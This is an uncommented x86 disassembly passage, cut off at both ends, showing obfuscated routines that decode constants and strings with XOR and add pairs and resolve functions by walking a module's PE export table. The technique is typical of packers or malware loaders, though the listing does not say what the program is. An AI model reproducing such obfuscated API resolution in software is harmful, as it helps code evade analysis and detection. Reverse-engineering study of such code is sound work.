  426641:	cmp    ebx,edi
  426643:	mov    di,WORD PTR [ebp-0x4]
  426647:	mov    bx,WORD PTR [ebp+0x8]
  42664b:	je     0x4266b6
  42664d:	cmp    bx,di
  426650:	je     0x4266bf
  426652:	mov    edi,DWORD PTR [ebp-0x20]
  426655:	mov    bx,WORD PTR [ebp+0x8]
  426659:	xor    edi,esi
  42665b:	add    edi,eax
  42665d:	cmp    bx,di
  426660:	jb     0x426680
  426662:	mov    edi,DWORD PTR [ebp-0x2c]
  426665:	mov    bx,WORD PTR [ebp+0x8]
  426669:	xor    edi,esi
  42666b:	add    edi,eax
  42666d:	cmp    bx,di
  426670:	ja     0x426680
  426672:	movzx  edi,WORD PTR [ebp+0x8]
  426676:	movzx  ebx,WORD PTR [ebp-0x8]
  42667a:	add    edi,ebx
  42667c:	mov    WORD PTR [ebp+0x8],di
  426680:	mov    edi,DWORD PTR [ebp-0x20]
  426683:	mov    bx,WORD PTR [ebp-0x4]
  426687:	xor    edi,esi
  426689:	add    edi,eax
  42668b:	cmp    bx,di
  42668e:	jb     0x4266ae
  426690:	mov    edi,DWORD PTR [ebp-0x2c]
  426693:	mov    bx,WORD PTR [ebp-0x4]
  426697:	xor    edi,esi
  426699:	add    edi,eax
  42669b:	cmp    bx,di
  42669e:	ja     0x4266ae
  4266a0:	movzx  edi,WORD PTR [ebp-0x4]
  4266a4:	movzx  ebx,WORD PTR [ebp-0x8]
  4266a8:	add    edi,ebx
  4266aa:	mov    WORD PTR [ebp-0x4],di
  4266ae:	mov    di,WORD PTR [ebp-0x4]
  4266b2:	mov    bx,WORD PTR [ebp+0x8]
  4266b6:	cmp    bx,di
  4266b9:	jne    0x4267b3
  4266bf:	mov    edi,DWORD PTR [ebp-0x1c]
  4266c2:	mov    ebx,DWORD PTR [ebp-0x10]
  4266c5:	xor    edi,ecx
  4266c7:	lea    edi,[edi+ebx*1+0x3272f6]
  4266ce:	mov    DWORD PTR [ebp-0x10],edi
  4266d1:	mov    edi,DWORD PTR [ebp-0x1c]
  4266d4:	mov    ebx,DWORD PTR [ebp-0x14]
  4266d7:	xor    edi,ecx
  4266d9:	lea    edi,[edi+ebx*1+0x3272f6]
  4266e0:	mov    DWORD PTR [ebp-0x14],edi
  4266e3:	mov    edi,DWORD PTR [ebp-0x24]
  4266e6:	mov    ebx,DWORD PTR [ebp-0x10]
  4266e9:	mov    di,WORD PTR [ebx+edi*2]
  4266ed:	mov    WORD PTR [ebp+0x8],di
  4266f1:	mov    edi,DWORD PTR [ebp-0x28]
  4266f4:	mov    ebx,DWORD PTR [ebp-0x14]
  4266f7:	mov    di,WORD PTR [ebx+edi*2]
  4266fb:	mov    WORD PTR [ebp-0x4],di
  4266ff:	mov    edi,DWORD PTR [ebp-0xc]
  426702:	mov    bx,WORD PTR [ebp+0x8]
  426706:	xor    edi,esi
  426708:	add    edi,eax
  42670a:	cmp    bx,di
  42670d:	jne    0x426623
  426713:	mov    eax,DWORD PTR [ebp-0x18]
  426716:	mov    esi,DWORD PTR [ebp-0xc]
  426719:	xor    eax,ecx
  42671b:	add    eax,edx
  42671d:	imul   eax,esi
  426720:	mov    DWORD PTR [ebp-0xc],eax
  426723:	jmp    0x426737
  426725:	mov    eax,DWORD PTR [ebp-0xc]
  426728:	mov    esi,DWORD PTR [ebp-0x18]
  42672b:	xor    eax,ecx
  42672d:	lea    eax,[eax+esi*1+0x3272f6]
  426734:	mov    DWORD PTR [ebp-0x18],eax
  426737:	mov    eax,DWORD PTR [ebp-0x24]
  42673a:	sub    eax,edx
  42673c:	xor    eax,ecx
  42673e:	mov    DWORD PTR [ebp-0x30],eax
  426741:	mov    eax,DWORD PTR [ebp-0x28]
  426744:	sub    eax,edx
  426746:	xor    eax,ecx
  426748:	mov    DWORD PTR [ebp-0x34],eax
  42674b:	mov    eax,DWORD PTR [ebp-0x34]
  42674e:	mov    esi,DWORD PTR [ebp-0x1c]
  426751:	xor    esi,ecx
  426753:	add    esi,edx
  426755:	xor    eax,ecx
  426757:	add    eax,0x3272f6
  42675c:	imul   esi,eax
  42675f:	mov    eax,DWORD PTR [ebp-0x14]
  426762:	movzx  eax,WORD PTR [esi+eax*1]
  426766:	mov    esi,DWORD PTR [ebp-0x30]
  426769:	mov    edi,DWORD PTR [ebp-0x1c]
  42676c:	xor    esi,ecx
  42676e:	add    esi,edx
  426770:	xor    edi,ecx
  426772:	add    edi,edx
  426774:	imul   edi,esi
  426777:	mov    esi,DWORD PTR [ebp-0x10]
  42677a:	movzx  esi,WORD PTR [edi+esi*1]
  42677e:	sub    eax,edx
  426780:	sub    esi,edx
  426782:	xor    eax,ecx
  426784:	xor    esi,ecx
  426786:	cmp    esi,eax
  426788:	jne    0x4267b3
  42678a:	mov    eax,DWORD PTR [ebp-0x30]
  42678d:	mov    esi,DWORD PTR [ebp-0x1c]
  426790:	xor    eax,ecx
  426792:	add    eax,0x3272f6
  426797:	xor    esi,ecx
  426799:	add    esi,edx
  42679b:	imul   esi,eax
  42679e:	mov    eax,DWORD PTR [ebp-0x10]
  4267a1:	movzx  eax,WORD PTR [esi+eax*1]
  4267a5:	mov    esi,DWORD PTR [ebp-0xc]
  4267a8:	sub    eax,edx
  4267aa:	xor    eax,ecx
  4267ac:	cmp    eax,esi
  4267ae:	mov    eax,DWORD PTR [ebp-0xc]
  4267b1:	je     0x4267b6
  4267b3:	mov    eax,DWORD PTR [ebp-0x18]
  4267b6:	pop    edi
  4267b7:	xor    eax,ecx
  4267b9:	pop    esi
  4267ba:	add    eax,edx
  4267bc:	pop    ebx
  4267bd:	leave  
  4267be:	ret    0x8
  4267c1:	push   ebp
  4267c2:	mov    ebp,esp
  4267c4:	push   ecx
  4267c5:	mov    cx,WORD PTR [eax]
  4267c8:	push   esi
  4267c9:	mov    esi,0x3b5d
  4267ce:	sub    cx,si
  4267d1:	mov    esi,0x8a9b
  4267d6:	xor    cx,si
  4267d9:	mov    esi,0x4e38
  4267de:	mov    DWORD PTR [ebp-0x4],0xf89c85a6
  4267e5:	mov    edx,0xf89c85a5
  4267ea:	cmp    cx,si
  4267ed:	je     0x42684c
  4267ef:	push   ebx
  4267f0:	push   edi
  4267f1:	movzx  ecx,cx
  4267f4:	mov    edi,0xffcd8d0a
  4267f9:	mov    esi,0x75108af
  4267fe:	mov    ebx,0x4e64
  426803:	cmp    cx,bx
  426806:	jne    0x42680b
  426808:	mov    DWORD PTR [ebp-0x4],edx
  42680b:	lea    edx,[edi+0x1]
  42680e:	xor    edx,esi
  426810:	mov    edi,edx
  426812:	xor    edi,esi
  426814:	mov    cx,WORD PTR [eax+edi*2+0x64e5ec]
  42681c:	mov    ebx,0x3b5d
  426821:	sub    cx,bx
  426824:	mov    ebx,0x8a9b
  426829:	xor    cx,bx
  42682c:	mov    ebx,0x4e38
  426831:	cmp    cx,bx
  426834:	jne    0x4267fe
  426836:	mov    ecx,DWORD PTR [ebp-0x4]
  426839:	pop    edi
  42683a:	pop    ebx
  42683b:	cmp    ecx,0xf89c85a6
  426841:	je     0x42684c
  426843:	xor    ecx,esi
  426845:	lea    eax,[eax+ecx*2+0x64e5ee]
  42684c:	pop    esi
  42684d:	leave  
  42684e:	ret    
  42684f:	push   ebp
  426850:	mov    ebp,esp
  426852:	push   ecx
  426853:	push   esi
  426854:	push   edi
  426855:	mov    DWORD PTR [ebp-0x4],0xf89c85a6
  42685c:	mov    esi,0xf89c85a5
  426861:	call   0x4267c1
  426866:	mov    edi,eax
  426868:	mov    al,BYTE PTR [edi]
  42686a:	sub    al,0x4
  42686c:	xor    al,0x7f
  42686e:	cmp    al,0x83
  426870:	je     0x4268d3
  426872:	mov    eax,edi
  426874:	mov    edx,0xffcd8d0a
  426879:	mov    ecx,0x75108af
  42687e:	push   ebx
  42687f:	mov    ax,WORD PTR [eax]
  426882:	mov    ebx,0x3b5d
  426887:	sub    ax,bx
  42688a:	mov    ebx,0x8a9b
  42688f:	xor    ax,bx
  426892:	mov    ebx,0x4e4a
  426897:	cmp    ax,bx
  42689a:	jne    0x42689f
  42689c:	mov    DWORD PTR [ebp-0x4],esi
  42689f:	lea    esi,[edx+0x1]
  4268a2:	xor    esi,ecx
  4268a4:	mov    edx,esi
  4268a6:	xor    edx,ecx
  4268a8:	lea    eax,[edi+edx*2+0x64e5ec]
  4268af:	mov    bl,BYTE PTR [eax]
  4268b1:	sub    bl,0x4
  4268b4:	xor    bl,0x7f
  4268b7:	cmp    bl,0x83
  4268ba:	jne    0x42687f
  4268bc:	mov    eax,DWORD PTR [ebp-0x4]
  4268bf:	pop    ebx
  4268c0:	cmp    eax,0xf89c85a6
  4268c5:	je     0x4268d3
  4268c7:	xor    eax,ecx
  4268c9:	xor    ecx,ecx
  4268cb:	mov    WORD PTR [edi+eax*2+0x64e5ec],cx
  4268d3:	mov    eax,edi
  4268d5:	pop    edi
  4268d6:	pop    esi
  4268d7:	leave  
  4268d8:	ret    
  4268d9:	push   ebp
  4268da:	mov    ebp,esp
  4268dc:	push   ecx
  4268dd:	push   esi
  4268de:	mov    DWORD PTR [ebp-0x4],0xf89c85a6
  4268e5:	mov    esi,0xf89c85a5
  4268ea:	call   0x4267c1
  4268ef:	mov    cx,WORD PTR [eax]
  4268f2:	mov    edx,0x3b5d
  4268f7:	sub    cx,dx
  4268fa:	mov    edx,0x8a9b
  4268ff:	xor    cx,dx
  426902:	mov    edx,0x4e38
  426907:	cmp    cx,dx
  42690a:	je     0x426963
  42690c:	push   ebx
  42690d:	push   edi
  42690e:	movzx  ecx,cx
  426911:	mov    edx,0xffcd8d0a
  426916:	mov    edi,0x75108af
  42691b:	mov    ebx,0x4e4a
  426920:	cmp    cx,bx
  426923:	jne    0x426928
  426925:	mov    DWORD PTR [ebp-0x4],esi
  426928:	lea    esi,[edx+0x1]
  42692b:	xor    esi,edi
  42692d:	mov    edx,esi
  42692f:	xor    edx,edi
  426931:	mov    cx,WORD PTR [eax+edx*2+0x64e5ec]
  426939:	mov    ebx,0x3b5d
  42693e:	sub    cx,bx
  426941:	mov    ebx,0x8a9b
  426946:	xor    cx,bx
  426949:	mov    ebx,0x4e38
  42694e:	cmp    cx,bx
  426951:	jne    0x42691b
  426953:	cmp    DWORD PTR [ebp-0x4],0xf89c85a6
  42695a:	pop    edi
  42695b:	pop    ebx
  42695c:	je     0x426963
  42695e:	xor    eax,eax
  426960:	inc    eax
  426961:	jmp    0x426965
  426963:	xor    eax,eax
  426965:	pop    esi
  426966:	leave  
  426967:	ret    
  426968:	push   ebp
  426969:	mov    ebp,esp
  42696b:	push   ecx
  42696c:	mov    eax,DWORD PTR [ebp+0x8]
  42696f:	movzx  ecx,WORD PTR [eax]
  426972:	push   esi
  426973:	lea    eax,[ecx-0x3b5d]
  426979:	mov    esi,0x8a9b
  42697e:	push   edi
  42697f:	xor    eax,esi
  426981:	mov    edi,0x4e38
  426986:	mov    DWORD PTR [ebp-0x4],edx
  426989:	cmp    ax,di
  42698c:	je     0x4269b9
  42698e:	mov    eax,DWORD PTR [ebp+0x8]
  426991:	sub    eax,edx
  426993:	mov    DWORD PTR [ebp+0x8],eax
  426996:	jmp    0x42699b
  426998:	mov    eax,DWORD PTR [ebp+0x8]
  42699b:	mov    WORD PTR [edx],cx
  42699e:	add    edx,0x2
  4269a1:	movzx  edi,WORD PTR [eax+edx*1]
  4269a5:	mov    ecx,edi
  4269a7:	add    edi,0xffffc4a3
  4269ad:	xor    edi,esi
  4269af:	mov    eax,0x4e38
  4269b4:	cmp    di,ax
  4269b7:	jne    0x426998
  4269b9:	xor    eax,eax
  4269bb:	pop    edi
  4269bc:	mov    WORD PTR [edx],ax
  4269bf:	mov    eax,DWORD PTR [ebp-0x4]
  4269c2:	pop    esi
  4269c3:	leave  
  4269c4:	ret    0x4
  4269c7:	push   ebp
  4269c8:	mov    ebp,esp
  4269ca:	sub    esp,0x18
  4269cd:	mov    DWORD PTR [ebp-0x8],0xf89c85a5
  4269d4:	mov    DWORD PTR [ebp-0x18],0xf89c85a4
  4269db:	mov    ecx,DWORD PTR [ebp-0x8]
  4269de:	push   esi
  4269df:	mov    eax,0x75108af
  4269e4:	xor    ecx,eax
  4269e6:	mov    esi,0x3272f6
  4269eb:	add    ecx,esi
  4269ed:	mov    DWORD PTR [ebp-0x4],ecx
  4269f0:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  4269f7:	mov    DWORD PTR [ebp-0x10],0xf89c85a1
  4269fe:	push   edi
  4269ff:	mov    DWORD PTR [ebp-0x14],0xf89c85a3
  426a06:	jmp    0x426aa7
  426a0b:	mov    ecx,DWORD PTR [ebp-0x4]
  426a0e:	mov    edx,DWORD PTR [ebp+0x10]
  426a11:	sub    edx,ecx
  426a13:	mov    ecx,DWORD PTR [ebp-0xc]
  426a16:	xor    ecx,eax
  426a18:	add    ecx,esi
  426a1a:	cmp    edx,ecx
  426a1c:	jbe    0x426a39
  426a1e:	mov    edx,DWORD PTR [ebp-0x4]
  426a21:	add    edx,DWORD PTR [ebp+0x8]
  426a24:	mov    ecx,DWORD PTR [ebp-0x4]
  426a27:	add    ecx,DWORD PTR [ebp+0xc]
  426a2a:	mov    edi,DWORD PTR [ecx]
  426a2c:	mov    DWORD PTR [edx],edi
  426a2e:	mov    ecx,DWORD PTR [ecx+0x4]
  426a31:	mov    DWORD PTR [edx+0x4],ecx
  426a34:	mov    ecx,DWORD PTR [ebp-0xc]
  426a37:	jmp    0x426a86
  426a39:	mov    ecx,DWORD PTR [ebp-0x4]
  426a3c:	mov    edx,DWORD PTR [ebp+0x10]
  426a3f:	sub    edx,ecx
  426a41:	mov    ecx,DWORD PTR [ebp-0x10]
  426a44:	xor    ecx,eax
  426a46:	add    ecx,esi
  426a48:	cmp    edx,ecx
  426a4a:	mov    ecx,DWORD PTR [ebp-0x4]
  426a4d:	jbe    0x426a61
  426a4f:	add    ecx,DWORD PTR [ebp+0x8]
  426a52:	mov    edx,DWORD PTR [ebp-0x4]
  426a55:	add    edx,DWORD PTR [ebp+0xc]
  426a58:	mov    edx,DWORD PTR [edx]
  426a5a:	mov    DWORD PTR [ecx],edx
  426a5c:	mov    ecx,DWORD PTR [ebp-0x10]
  426a5f:	jmp    0x426a86
  426a61:	mov    edx,DWORD PTR [ebp+0x10]
  426a64:	sub    edx,ecx
  426a66:	mov    ecx,DWORD PTR [ebp-0x14]
  426a69:	xor    ecx,eax
  426a6b:	add    ecx,esi
  426a6d:	cmp    edx,ecx
  426a6f:	mov    ecx,DWORD PTR [ebp-0x4]
  426a72:	jbe    0x426a97
  426a74:	add    ecx,DWORD PTR [ebp+0x8]
  426a77:	mov    edx,DWORD PTR [ebp-0x4]
  426a7a:	add    edx,DWORD PTR [ebp+0xc]
  426a7d:	mov    dx,WORD PTR [edx]
  426a80:	mov    WORD PTR [ecx],dx
  426a83:	mov    ecx,DWORD PTR [ebp-0x14]
  426a86:	mov    edx,DWORD PTR [ebp-0x4]
  426a89:	xor    ecx,eax
  426a8b:	lea    ecx,[ecx+edx*1+0x3272f6]
  426a92:	mov    DWORD PTR [ebp-0x4],ecx
  426a95:	jmp    0x426aa7
  426a97:	add    ecx,DWORD PTR [ebp+0x8]
  426a9a:	mov    edx,DWORD PTR [ebp-0x4]
  426a9d:	add    edx,DWORD PTR [ebp+0xc]
  426aa0:	mov    dl,BYTE PTR [edx]
  426aa2:	mov    BYTE PTR [ecx],dl
  426aa4:	inc    DWORD PTR [ebp-0x4]
  426aa7:	mov    ecx,DWORD PTR [ebp-0x18]
  426aaa:	mov    edx,DWORD PTR [ebp+0x10]
  426aad:	xor    ecx,eax
  426aaf:	add    ecx,esi
  426ab1:	imul   ecx,edx
  426ab4:	mov    edx,DWORD PTR [ebp-0x8]
  426ab7:	mov    edi,DWORD PTR [ebp-0x4]
  426aba:	xor    edx,eax
  426abc:	lea    edx,[edx+edi*1+0x3272f6]
  426ac3:	cmp    edx,ecx
  426ac5:	jb     0x426a0b
  426acb:	pop    edi
  426acc:	pop    esi
  426acd:	leave  
  426ace:	ret    0xc
  426ad1:	push   ebp
  426ad2:	mov    ebp,esp
  426ad4:	sub    esp,0xc
  426ad7:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  426ade:	push   esi
  426adf:	mov    esi,eax
  426ae1:	mov    DWORD PTR [ebp-0x8],0xf89c85a4
  426ae8:	mov    edx,DWORD PTR [ebp-0x4]
  426aeb:	mov    eax,0x75108af
  426af0:	xor    edx,eax
  426af2:	mov    ecx,0x3272f6
  426af7:	add    edx,ecx
  426af9:	cmp    esi,edx
  426afb:	je     0x426b3d
  426afd:	push   ebx
  426afe:	push   edi
  426aff:	mov    edx,DWORD PTR [ebp-0x8]
  426b02:	mov    ebx,DWORD PTR [ebp+0x8]
  426b05:	xor    edx,eax
  426b07:	mov    edi,0xffcd8d0a
  426b0c:	sub    edi,edx
  426b0e:	add    esi,edi
  426b10:	lea    edx,[esi-0x3272f6]
  426b16:	xor    edx,eax
  426b18:	mov    DWORD PTR [ebp-0xc],edx
  426b1b:	mov    edx,DWORD PTR [ebp-0x4]
  426b1e:	mov    edi,DWORD PTR [ebp-0xc]
  426b21:	xor    dl,0xaf
  426b24:	sub    dl,0xa
  426b27:	xor    edi,eax
  426b29:	mov    BYTE PTR [edi+ebx*1+0x3272f6],dl
  426b30:	mov    edx,DWORD PTR [ebp-0x4]
  426b33:	xor    edx,eax
  426b35:	add    edx,ecx
  426b37:	cmp    esi,edx
  426b39:	jne    0x426aff
  426b3b:	pop    edi
  426b3c:	pop    ebx
  426b3d:	pop    esi
  426b3e:	leave  
  426b3f:	ret    0x4
  426b42:	push   ebp
  426b43:	mov    ebp,esp
  426b45:	sub    esp,0x21c
  426b4b:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  426b52:	mov    DWORD PTR [ebp-0x14],0xf89c85a4
  426b59:	mov    eax,DWORD PTR [ebp+0x10]
  426b5c:	mov    eax,DWORD PTR [ebp-0x4]
  426b5f:	mov    ecx,DWORD PTR [ebp+0x8]
  426b62:	push   esi
  426b63:	push   edi
  426b64:	mov    edi,0x75108af
  426b69:	xor    eax,edi
  426b6b:	mov    esi,0x3272f6
  426b70:	add    eax,esi
  426b72:	cmp    eax,ecx
  426b74:	mov    eax,DWORD PTR [ebp-0x4]
  426b77:	jne    0x426b82
  426b79:	xor    eax,edi
  426b7b:	add    eax,esi
  426b7d:	jmp    0x426c2e
  426b82:	mov    ecx,DWORD PTR [ebp+0xc]
  426b85:	xor    eax,edi
  426b87:	add    eax,esi
  426b89:	cmp    eax,ecx
  426b8b:	jne    0x426b92
  426b8d:	mov    eax,DWORD PTR [ebp-0x4]
  426b90:	jmp    0x426b79
  426b92:	lea    eax,[ebp-0x21c]
  426b98:	mov    DWORD PTR [ebp-0x8],eax
  426b9b:	mov    eax,DWORD PTR [ebp+0xc]
  426b9e:	mov    DWORD PTR [ebp-0x10],eax
  426ba1:	mov    eax,DWORD PTR [ebp-0x4]
  426ba4:	xor    eax,edi
  426ba6:	add    eax,esi
  426ba8:	mov    DWORD PTR [ebp+0x10],eax
  426bab:	mov    eax,DWORD PTR [ebp+0xc]
  426bae:	push   ebx
  426baf:	call   0x4268d9
  426bb4:	mov    ebx,eax
  426bb6:	mov    eax,DWORD PTR [ebp+0x8]
  426bb9:	mov    eax,DWORD PTR [eax+0x14]
  426bbc:	jmp    0x426c16
  426bbe:	mov    eax,DWORD PTR [ebp+0xc]
  426bc1:	sub    eax,0x8
  426bc4:	mov    DWORD PTR [ebp-0xc],eax
  426bc7:	mov    eax,DWORD PTR [ebp-0xc]
  426bca:	mov    eax,DWORD PTR [eax+0x28]
  426bcd:	call   0x4267c1
  426bd2:	mov    DWORD PTR [ebp+0x10],eax
  426bd5:	push   DWORD PTR [ebp+0x10]
  426bd8:	mov    edx,DWORD PTR [ebp-0x8]
  426bdb:	call   0x426968
  426be0:	mov    eax,DWORD PTR [ebp-0x4]
  426be3:	xor    eax,edi
  426be5:	add    eax,esi
  426be7:	cmp    eax,ebx
  426be9:	jne    0x426bf3
  426beb:	mov    eax,DWORD PTR [ebp-0x8]
  426bee:	call   0x42684f
  426bf3:	mov    eax,DWORD PTR [ebp-0x14]
  426bf6:	xor    eax,edi
  426bf8:	add    eax,esi
  426bfa:	push   eax
  426bfb:	push   DWORD PTR [ebp-0x10]
  426bfe:	mov    eax,DWORD PTR [ebp-0x8]
  426c01:	call   0x42657b
  426c06:	mov    ecx,DWORD PTR [ebp-0x4]
  426c09:	xor    ecx,edi
  426c0b:	add    ecx,esi
  426c0d:	cmp    eax,ecx
  426c0f:	je     0x426c34
  426c11:	mov    eax,DWORD PTR [ebp+0xc]
  426c14:	mov    eax,DWORD PTR [eax]
  426c16:	mov    DWORD PTR [ebp+0xc],eax
  426c19:	mov    eax,DWORD PTR [ebp+0x8]
  426c1c:	mov    ecx,DWORD PTR [ebp+0xc]
  426c1f:	add    eax,0x14
  426c22:	cmp    ecx,eax
  426c24:	jne    0x426bbe
  426c26:	mov    eax,DWORD PTR [ebp-0x4]
  426c29:	xor    eax,edi
  426c2b:	add    eax,esi
  426c2d:	pop    ebx
  426c2e:	pop    edi
  426c2f:	pop    esi
  426c30:	leave  
  426c31:	ret    0xc
  426c34:	mov    eax,DWORD PTR [ebp-0xc]
  426c37:	mov    eax,DWORD PTR [eax+0x18]
  426c3a:	jmp    0x426c2d
  426c3c:	push   ebp
  426c3d:	mov    ebp,esp
  426c3f:	mov    eax,DWORD PTR [ebp+0xc]
  426c42:	sub    esp,0x10
  426c45:	cmp    DWORD PTR [ebp+0x8],0x0
  426c49:	push   ebx
  426c4a:	push   esi
  426c4b:	push   edi
  426c4c:	je     0x426d01
  426c52:	test   eax,eax
  426c54:	je     0x426d01
  426c5a:	movzx  eax,WORD PTR [eax+0x20]
  426c5e:	mov    ecx,eax
  426c60:	mov    DWORD PTR [ebp-0x10],eax
  426c63:	xor    edx,edx
  426c65:	and    DWORD PTR [ebp-0x8],edx
  426c68:	mov    eax,0x8a9b
  426c6d:	xor    ecx,eax
  426c6f:	add    ecx,0x3b5d
  426c75:	mov    DWORD PTR [ebp-0xc],ecx
  426c78:	and    DWORD PTR [ebp-0x4],0x0
  426c7c:	xor    ecx,ecx
  426c7e:	push   0xffffff81
  426c80:	pop    edi
  426c81:	cmp    cx,WORD PTR [ebp-0xc]
  426c85:	jae    0x426ceb
  426c87:	lea    esi,[edx-0x3b5d]
  426c8d:	xor    esi,eax
  426c8f:	movzx  ecx,WORD PTR [ebp-0x4]
  426c93:	mov    ebx,DWORD PTR [ebp+0xc]
  426c96:	lea    ecx,[ebx+ecx*4]
  426c99:	cmp    WORD PTR [ecx+0x2],si
  426c9d:	jne    0x426cd6
  426c9f:	movzx  ecx,WORD PTR [ecx]
  426ca2:	mov    edi,0x4e38
  426ca7:	cmp    cx,di
  426caa:	jne    0x426cb8
  426cac:	mov    ebx,DWORD PTR [ebp+0x8]
  426caf:	movzx  edi,dx
  426cb2:	cmp    BYTE PTR [edi+ebx*1],0x0
  426cb6:	je     0x426ce5
  426cb8:	mov    ebx,DWORD PTR [ebp+0x8]
  426cbb:	movzx  edi,dx
  426cbe:	movsx  di,BYTE PTR [edi+ebx*1]
  426cc3:	mov    ebx,0x3b5d
  426cc8:	sub    di,bx
  426ccb:	xor    di,ax
  426cce:	cmp    cx,di
  426cd1:	je     0x426ce5
  426cd3:	push   0xffffff83
  426cd5:	pop    edi
  426cd6:	inc    DWORD PTR [ebp-0x4]
  426cd9:	mov    cx,WORD PTR [ebp-0xc]
  426cdd:	cmp    WORD PTR [ebp-0x4],cx
  426ce1:	jb     0x426c8f
  426ce3:	jmp    0x426ceb
  426ce5:	inc    DWORD PTR [ebp-0x8]
  426ce8:	push   0xffffff82
  426cea:	pop    edi
  426ceb:	mov    esi,DWORD PTR [ebp+0x8]
  426cee:	movzx  ecx,dx
  426cf1:	cmp    BYTE PTR [ecx+esi*1],0x0
  426cf5:	je     0x426d0a
  426cf7:	inc    edx
  426cf8:	cmp    edi,0xffffff83
  426cfb:	jne    0x426c78
  426d01:	xor    eax,eax
  426d03:	pop    edi
  426d04:	pop    esi
  426d05:	pop    ebx
  426d06:	leave  
  426d07:	ret    0x8
  426d0a:	mov    ecx,DWORD PTR [ebp-0x8]
  426d0d:	add    ecx,0xffffc4a3
  426d13:	xor    cx,ax
  426d16:	xor    eax,eax
  426d18:	cmp    cx,WORD PTR [ebp-0x10]
  426d1c:	sete   al
  426d1f:	jmp    0x426d03
  426d21:	push   ebp
  426d22:	mov    ebp,esp
  426d24:	sub    esp,0x50
  426d27:	push   edi
  426d28:	mov    edi,eax
  426d2a:	mov    eax,DWORD PTR [edi+0x1a8]
  426d30:	cmp    DWORD PTR [eax],0x0
  426d33:	jne    0x426d3c
  426d35:	xor    eax,eax
  426d37:	jmp    0x426e6d
  426d3c:	push   DWORD PTR [ebp+0x8]
  426d3f:	push   0x2c
  426d41:	pop    eax
  426d42:	call   0x426ad1
  426d47:	mov    edx,DWORD PTR [edi+0x1ac]
  426d4d:	lea    eax,[edi+0x22]
  426d50:	mov    DWORD PTR [ebp-0x4c],eax
  426d53:	lea    eax,[edi+0x44]
  426d56:	mov    DWORD PTR [ebp-0x48],eax
  426d59:	lea    eax,[edi+0x66]
  426d5c:	mov    DWORD PTR [ebp-0x44],eax
  426d5f:	lea    eax,[edi+0x88]
  426d65:	mov    DWORD PTR [ebp-0x40],eax
  426d68:	lea    eax,[edi+0xaa]
  426d6e:	mov    DWORD PTR [ebp-0x3c],eax
  426d71:	lea    eax,[edi+0xcc]
  426d77:	mov    DWORD PTR [ebp-0x38],eax
  426d7a:	lea    eax,[edi+0xee]
  426d80:	mov    DWORD PTR [ebp-0x34],eax
  426d83:	lea    eax,[edi+0x110]
  426d89:	mov    DWORD PTR [ebp-0x30],eax
  426d8c:	lea    eax,[edi+0x132]
  426d92:	mov    DWORD PTR [ebp-0x2c],eax
  426d95:	lea    eax,[edi+0x154]
  426d9b:	push   edi
  426d9c:	mov    DWORD PTR [ebp-0x50],edi
  426d9f:	mov    DWORD PTR [ebp-0x28],eax
  426da2:	call   0x426ea1
  426da7:	push   eax
  426da8:	mov    eax,DWORD PTR [edi+0x1a8]
  426dae:	push   DWORD PTR [eax]
  426db0:	call   0x426b42
  426db5:	mov    DWORD PTR [ebp-0x10],eax
  426db8:	test   eax,eax
  426dba:	je     0x426e6d
  426dc0:	mov    ecx,DWORD PTR [eax+0x3c]
  426dc3:	push   ebx
  426dc4:	push   esi
  426dc5:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  426dc9:	add    esi,eax
  426dcb:	mov    edi,DWORD PTR [esi+0x24]
  426dce:	mov    ecx,DWORD PTR [esi+0x1c]
  426dd1:	mov    edx,DWORD PTR [esi+0x20]
  426dd4:	mov    ebx,DWORD PTR [esi+0x18]
  426dd7:	add    edi,eax
  426dd9:	mov    DWORD PTR [ebp-0x20],edi
  426ddc:	mov    edi,DWORD PTR [esi+0x14]
  426ddf:	add    ecx,eax
  426de1:	add    edx,eax
  426de3:	mov    DWORD PTR [ebp-0xc],ecx
  426de6:	mov    DWORD PTR [ebp-0x1c],edx
  426de9:	mov    DWORD PTR [ebp-0x8],edi
  426dec:	cmp    edi,ebx
  426dee:	ja     0x426df3
  426df0:	mov    DWORD PTR [ebp-0x8],ebx
  426df3:	xor    ebx,ebx
  426df5:	mov    DWORD PTR [ebp-0x18],ebx
  426df8:	cmp    DWORD PTR [ebp-0x8],ebx
  426dfb:	jbe    0x426e6b
  426dfd:	jmp    0x426e02
  426dff:	mov    edx,DWORD PTR [ebp-0x1c]
  426e02:	mov    edi,DWORD PTR [ebp-0x20]
  426e05:	movzx  edi,WORD PTR [edi+ebx*2]
  426e09:	cmp    ebx,DWORD PTR [esi+0x18]
  426e0c:	jae    0x426e6b
  426e0e:	cmp    edi,DWORD PTR [esi+0x14]
  426e11:	jae    0x426e6b
  426e13:	mov    ebx,DWORD PTR [edx+ebx*4]
  426e16:	mov    edx,DWORD PTR [ebp+0x8]
  426e19:	mov    edi,DWORD PTR [ecx+edi*4]
  426e1c:	mov    DWORD PTR [ebp-0x4],edx
  426e1f:	lea    edx,[ebp-0x50]
  426e22:	add    ebx,eax
  426e24:	add    edi,eax
  426e26:	sub    edx,DWORD PTR [ebp+0x8]
  426e29:	mov    DWORD PTR [ebp-0x14],0xb
  426e30:	mov    DWORD PTR [ebp-0x24],edx
  426e33:	mov    edx,DWORD PTR [ebp-0x4]
  426e36:	cmp    DWORD PTR [edx],0x0
  426e39:	jne    0x426e56
  426e3b:	mov    eax,DWORD PTR [ebp-0x24]
  426e3e:	push   DWORD PTR [eax+edx*1]
  426e41:	push   ebx
  426e42:	call   0x426c3c
  426e47:	mov    ecx,DWORD PTR [ebp-0xc]
  426e4a:	test   eax,eax
  426e4c:	je     0x426e53
  426e4e:	mov    eax,DWORD PTR [ebp-0x4]
  426e51:	mov    DWORD PTR [eax],edi
  426e53:	mov    eax,DWORD PTR [ebp-0x10]
  426e56:	add    DWORD PTR [ebp-0x4],0x4
  426e5a:	dec    DWORD PTR [ebp-0x14]
  426e5d:	jne    0x426e33
  426e5f:	mov    ebx,DWORD PTR [ebp-0x18]
  426e62:	inc    ebx
  426e63:	mov    DWORD PTR [ebp-0x18],ebx
  426e66:	cmp    ebx,DWORD PTR [ebp-0x8]
  426e69:	jb     0x426dff
  426e6b:	pop    esi
  426e6c:	pop    ebx
  426e6d:	pop    edi
  426e6e:	leave  
  426e6f:	ret    0x4
  426e72:	push   ebp
  426e73:	mov    ebp,esp
  426e75:	mov    eax,DWORD PTR [ebp+0x8]
  426e78:	push   esi
  426e79:	push   DWORD PTR [eax+0x1e0]
  426e7f:	lea    esi,[eax+0x198]
